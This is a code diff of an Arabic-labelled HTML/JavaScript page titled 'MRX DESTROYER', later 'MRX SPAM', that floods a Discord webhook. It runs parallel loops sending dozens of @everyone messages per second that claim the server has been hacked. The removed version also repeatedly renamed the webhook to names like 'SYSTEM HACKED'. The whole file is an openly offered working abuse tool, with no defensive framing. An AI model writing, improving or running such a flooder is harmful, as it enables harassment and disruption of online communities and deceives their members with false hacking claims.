@@ -1,318 +1,175 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MRX · DESTROYER · </title>
+    <title>MRX SPAM</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            font-family:'Segoe UI',sans-serif;
-            background:#0a0a0a; color:#f0f0f0;
-            min-height:100vh; overflow-x:hidden;
+            font-family: Arial; background: #0a0a0a; color: #fff;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; margin: 0;
         }
-        .container {
-            max-width:800px; margin:40px auto; padding:30px;
-            background:#111; border-radius:30px;
-            border:1px solid #2a2a2a;
+        .box {
+            background: #111; border: 1px solid #333;
+            border-radius: 30px; padding: 40px;
+            width: 500px; max-width: 95%;
+            text-align: center;
         }
-        h1 {
-            text-align:center; color:#ff1a1a;
-            font-size:42px; letter-spacing:8px;
-            margin-bottom:5px;
-        }
-        .sub {
-            text-align:center; color:#555;
-            font-size:12px; letter-spacing:4px;
-            margin-bottom:20px;
-        }
-        label {
-            display:block; margin:15px 0 8px;
-            color:#888; font-weight:600; letter-spacing:2px;
-        }
+        h1 { color: #ff1a1a; letter-spacing: 5px; margin: 0 0 5px; }
+        p { color: #666; font-size: 13px; margin: 0 0 20px; }
         input {
-            width:100%; padding:16px 20px;
-            background:#1a1a1a; border:1px solid #333;
-            border-radius:30px; color:#f0f0f0; font-size:14px;
-            direction:ltr; text-align:left; outline:none;
+            width: 100%; padding: 15px 20px;
+            background: #1a1a1a; border: 1px solid #333;
+            border-radius: 30px; color: #fff; font-size: 14px;
+            direction: ltr; text-align: left; outline: none;
+            box-sizing: border-box;
         }
-        input:focus { border-color:#ff1a1a; }
-        textarea {
-            width:100%; height:200px;
-            background:#050505; color:#00ff88;
-            border:1px solid #2a2a2a; border-radius:20px;
-            padding:18px; font-family:'Courier New',monospace;
-            font-size:12px; resize:vertical; direction:ltr;
-            text-align:left; outline:none;
-        }
-        .btn-row {
-            display:flex; gap:10px; margin:20px 0;
-            justify-content:center; flex-wrap:wrap;
-        }
+        input:focus { border-color: #ff1a1a; }
+        .btn-row { display: flex; gap: 10px; margin: 20px 0; }
         .btn-start {
-            padding:18px 50px; background:#cc0000; color:#fff;
-            border:none; border-radius:30px; font-size:16px;
-            font-weight:700; cursor:pointer; letter-spacing:3px;
-            transition:0.3s; flex:1; min-width:180px;
+            flex: 1; padding: 16px; background: #cc0000; color: #fff;
+            border: none; border-radius: 30px; font-size: 16px;
+            font-weight: 700; cursor: pointer; letter-spacing: 3px;
         }
-        .btn-start:hover { background:#ff1a1a; transform:scale(1.02); }
-        .btn-start:disabled { opacity:0.3; cursor:not-allowed; transform:none; }
+        .btn-start:hover { background: #ff1a1a; }
+        .btn-start:disabled { opacity: 0.3; cursor: not-allowed; }
         .btn-stop {
-            padding:18px 50px; background:#222; color:#888;
-            border:1px solid #444; border-radius:30px; font-size:16px;
-            font-weight:700; cursor:pointer; letter-spacing:3px;
-            transition:0.3s; flex:1; min-width:180px;
+            flex: 1; padding: 16px; background: #222; color: #888;
+            border: 1px solid #444; border-radius: 30px; font-size: 16px;
+            font-weight: 700; cursor: pointer; letter-spacing: 3px;
         }
-        .btn-stop:hover { background:#cc0000; color:#fff; border-color:#cc0000; }
-        .btn-stop:disabled { opacity:0.3; cursor:not-allowed; }
-        .stats {
-            display:flex; gap:30px; justify-content:center;
-            margin:15px 0; font-size:14px; color:#666;
+        .btn-stop:hover { background: #cc0000; color: #fff; }
+        .btn-stop:disabled { opacity: 0.3; cursor: not-allowed; }
+        #log {
+            width: 100%; height: 180px; margin-top: 15px;
+            background: #050505; color: #00ff88;
+            border: 1px solid #2a2a2a; border-radius: 16px;
+            padding: 15px; font-family: monospace; font-size: 12px;
+            direction: ltr; text-align: left; box-sizing: border-box;
+            resize: none;
         }
-        .stats span { color:#00ff88; font-weight:700; }
-        .note {
-            background:#1a0000; border:1px solid #440000;
-            border-radius:16px; padding:15px; margin:10px 0;
-            color:#ff6666; font-size:13px; text-align:center;
-        }
-        .note2 {
-            background:#001a0a; border:1px solid #004400;
-            border-radius:16px; padding:12px; margin:10px 0;
-            color:#66ff88; font-size:12px; text-align:center;
-        }
-        #copyBtn {
-            padding:8px 20px; background:transparent; color:#555;
-            border:1px solid #333; border-radius:20px; cursor:pointer;
-            margin-top:10px; font-size:12px;
-        }
-        #copyBtn:hover { background:#1a1a1a; }
+        #count { color: #00ff88; font-size: 24px; font-weight: 700; }
     </style>
 </head>
 <body>
-
-<div class="container">
+<div class="box">
     <h1>☠️ MRX</h1>
-    <div class="sub">● DESTROYER v20 · UNLIMITED EDITION ●</div>
+    <p>● @everyone SPAM — غير محدود ●</p>
+
+    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
     
-    <div class="note">
-        🚀 إرسال غير محدود | بدون أخطاء | ما يتوقف أبداً
-    </div>
-
-    <label>🔗 رابط Webhook ديسكورد:</label>
-    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." style="margin-bottom:10px;">
-
-    <label>💬 نص الرسالة (مثل @everyone):</label>
-    <input type="text" id="msgText" value="@everyone تم اختراق السيرفر بالكامل — MRX DESTROYER @everyone" style="margin-bottom:10px;">
-
     <div class="btn-row">
-        <button class="btn-start" id="startBtn" onclick="startAttack()">💀 بدء التدمير</button>
-        <button class="btn-stop" id="stopBtn" onclick="stopAttack()" disabled>⛔ إيقاف</button>
+        <button class="btn-start" id="startBtn" onclick="start()">💀 ابدأ</button>
+        <button class="btn-stop" id="stopBtn" onclick="stop()" disabled>⛔ إيقاف</button>
     </div>
 
-    <div class="stats">
-        <div>الرسائل المرسلة: <span id="count">0</span></div>
-        <div>الحالة: <span id="status">🟢 متوقف</span></div>
-    </div>
+    <div>تم الإرسال: <span id="count">0</span></div>
 
-    <div class="note2" id="speedInfo">
-        ⚡ يرسل ~5 رسائل كل ثانية | لا نهائي | استخدم زر الإيقاف
-    </div>
-
-    <label>📋 سجل الإرسال:</label>
-    <textarea id="log" readonly placeholder="... سجل الإرسال"></textarea>
-    <button id="copyBtn" onclick="copyLog()">📋 نسخ</button>
+    <textarea id="log" readonly placeholder="... السجل"></textarea>
 </div>
 
 <script>
-// ====== الإعدادات ======
-let isRunning = false;
+let running = false;
 let stopReq = false;
-let sentCount = 0;
-let timers = [];
+let count = 0;
+let t1, t2, t3, t4, t5; // 5 timers
 
 function $(id) { return document.getElementById(id); }
 
-function log(txt) {
+function log(msg) {
     const el = $('log');
-    el.value += `[${new Date().toLocaleTimeString()}] ${txt}\n`;
+    el.value += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
     el.scrollTop = el.scrollHeight;
 }
 
-function updateUI() {
-    $('count').textContent = sentCount;
-    $('status').textContent = isRunning ? '🔴 التدمير نشط' : '🟢 متوقف';
-    $('startBtn').disabled = isRunning;
-    $('stopBtn').disabled = !isRunning;
-}
-
-// ====== الإرسال القوي (بدون CORS) ======
-async function sendMsg(webhook, msg) {
+// ====== أسرع إرسال ======
+async function shoot(webhook, msg) {
     if (stopReq) return;
-    
-    // نستخدم FormData عشان نتجاوز CORS
-    const formData = new FormData();
-    const payload = JSON.stringify({
-        content: msg,
-        embeds: [{
-            title: '💀 MRX DESTROYER',
-            description: 'تم اختراق السيرفر — النظام التراكسي',
-            color: 0xff0000,
-            footer: { text: 'MRX ☣️ UNSTOPPABLE' }
-        }]
-    });
-    formData.append('payload_json', payload);
-
     try {
-        // mode: 'no-cors' = يرسل حتى من ملف محلي بدون مشاكل CORS
-        await fetch(webhook, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: formData
-        });
-        // مع no-cors ما نقدر نقرأ الرد، لكن الرسالة وصلت
-        sentCount++;
-        if (sentCount % 10 === 0) {
-            log(`📨 تم إرسال ${sentCount} رسالة`);
-            updateUI();
+        const f = new FormData();
+        f.append('payload_json', JSON.stringify({ content: msg }));
+        await fetch(webhook, { method: 'POST', mode: 'no-cors', body: f });
+        count++;
+        if (count % 20 === 0) {
+            $('count').textContent = count;
+            log(`📨 ${count} رسالة @everyone`);
         }
-    } catch(e) {
-        // silent - no-cors ما يعطي أخطاء
-    }
+    } catch(e) {}
 }
 
-// ====== الحلقات المكثفة ======
-function runLoop(webhook, msg) {
+// ====== 5 حلقات متوازية — كل حلقة ترمي 10 رسائل بالدفعة ======
+function loop1(wh, msg) {
     if (stopReq) return;
-    
-    // نرسل 5 مرات متتالية بدون انتظار
-    for (let i = 0; i < 5; i++) {
-        if (stopReq) break;
-        sendMsg(webhook, msg);
-    }
-    
-    // نكرر بعد 300ms فقط
-    if (!stopReq) {
-        const t = setTimeout(() => runLoop(webhook, msg), 300);
-        timers.push(t);
-    }
+    for (let i = 0; i < 10; i++) shoot(wh, msg);
+    t1 = setTimeout(() => loop1(wh, msg), 200);
 }
-
-function runLoop2(webhook, msg) {
+function loop2(wh, msg) {
     if (stopReq) return;
-    
-    // حلقة ثانية للرسائل النصية فقط (أخف وزن)
-    const shortMsg = '@everyone ☣️ MRX | TRX HUB | SYSTEM DESTROYED ☣️ @everyone';
-    const formData = new FormData();
-    formData.append('payload_json', JSON.stringify({ content: shortMsg }));
-    
-    for (let i = 0; i < 3; i++) {
-        if (stopReq) break;
-        fetch(webhook, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: formData
-        }).catch(() => {});
-        sentCount++;
-    }
-
-    if (!stopReq) {
-        const t = setTimeout(() => runLoop2(webhook, msg), 400);
-        timers.push(t);
-    }
+    for (let i = 0; i < 10; i++) shoot(wh, msg);
+    t2 = setTimeout(() => loop2(wh, msg), 250);
 }
-
-function renameLoop(webhook) {
+function loop3(wh, msg) {
     if (stopReq) return;
-    
-    const names = ['TRX ☣️', 'MRX DESTROYER', 'SYSTEM HACKED', '🤖 TRX HUB'];
-    const name = names[Math.floor(Math.random() * names.length)];
-    const formData = new FormData();
-    formData.append('payload_json', JSON.stringify({}));
-    
-    // PATCH لتغيير اسم الويب هوك
-    fetch(webhook, {
-        method: 'PATCH',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: name })
-    }).catch(() => {});
-    log(`✅ تم تغيير اسم البوت → ${name}`);
-
-    if (!stopReq) {
-        const t = setTimeout(() => renameLoop(webhook), 2000);
-        timers.push(t);
-    }
+    for (let i = 0; i < 10; i++) shoot(wh, msg);
+    t3 = setTimeout(() => loop3(wh, msg), 300);
+}
+function loop4(wh, msg) {
+    if (stopReq) return;
+    for (let i = 0; i < 10; i++) shoot(wh, msg);
+    t4 = setTimeout(() => loop4(wh, msg), 350);
+}
+function loop5(wh, msg) {
+    if (stopReq) return;
+    for (let i = 0; i < 10; i++) shoot(wh, msg);
+    t5 = setTimeout(() => loop5(wh, msg), 400);
 }
 
-// ====== التحكم ======
-function startAttack() {
-    const webhook = $('webhook').value.trim();
-    const msg = $('msgText').value.trim() || '@everyone تم اختراق السيرفر بالكامل — MRX DESTROYER @everyone';
-    
-    if (!webhook) {
-        alert('❌ حط رابط Webhook أول');
-        return;
-    }
-    
-    if (isRunning) return;
-    
-    isRunning = true;
+function start() {
+    const wh = $('webhook').value.trim();
+    if (!wh) { alert('حط رابط Webhook'); return; }
+    if (running) return;
+
+    const msg = '@everyone تم اختراق السيرفر بالكامل — MRX DESTROYER — @everyone';
+
+    running = true;
     stopReq = false;
-    sentCount = 0;
-    timers = [];
+    count = 0;
+    $('count').textContent = '0';
+    $('startBtn').disabled = true;
+    $('stopBtn').disabled = false;
     
-    log('🚀 ── بدء التدمير القوي ──');
-    log('🚀 إرسال غير محدود | يشتغل حتى يقف');
-    
-    updateUI();
-    
-    // نشغل 3 حلقات بالتوازي
-    runLoop(webhook, msg);
-    runLoop2(webhook, msg);
-    renameLoop(webhook);
-    
-    // تحديث الواجهة كل ثانية
-    const uiTimer = setInterval(() => {
-        updateUI();
-        if (stopReq) clearInterval(uiTimer);
-    }, 1000);
-    timers.push(uiTimer);
+    log('🚀 @everyone سبام غير محدود بدأ!');
+
+    // 5 حلقات تطير مع بعض = أقصى سرعة
+    loop1(wh, msg);
+    loop2(wh, msg);
+    loop3(wh, msg);
+    loop4(wh, msg);
+    loop5(wh, msg);
+
+    // تحديث العداد
+    const ui = setInterval(() => {
+        $('count').textContent = count;
+        if (stopReq) clearInterval(ui);
+    }, 500);
+    setTimeout(() => { if(!stopReq) ui; }, 500);
 }
 
-function stopAttack() {
-    if (!isRunning) return;
-    
-    log('⛔ ── جاري إيقاف التدمير...');
+function stop() {
+    if (!running) return;
+    log('⛔ جاري الإيقاف...');
     stopReq = true;
-    
-    // نلغي كل التايمرات
-    for (const t of timers) {
-        clearTimeout(t);
-        clearInterval(t);
-    }
-    timers = [];
+    clearTimeout(t1); clearTimeout(t2); clearTimeout(t3);
+    clearTimeout(t4); clearTimeout(t5);
     
     setTimeout(() => {
-        isRunning = false;
-        updateUI();
-        log(`🛑 تم الإيقاف. إجمالي الرسائل: ${sentCount}`);
-        $('speedInfo').textContent = '✅ تم الإيقاف بنجاح';
-    }, 500);
+        running = false;
+        $('startBtn').disabled = false;
+        $('stopBtn').disabled = true;
+        $('count').textContent = count;
+        log(`🛑 توقف.总 الرسائل: ${count}`);
+    }, 300);
 }
-
-function copyLog() {
-    const el = $('log');
-    el.select();
-    el.setSelectionRange(0, 999999);
-    document.execCommand('copy');
-}
-
-// Enter يبدأ الإرسال
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'Enter' && document.activeElement === $('webhook') || document.activeElement === $('msgText')) {
-        startAttack();
-    }
-});
 </script>
 </body>
 </html>
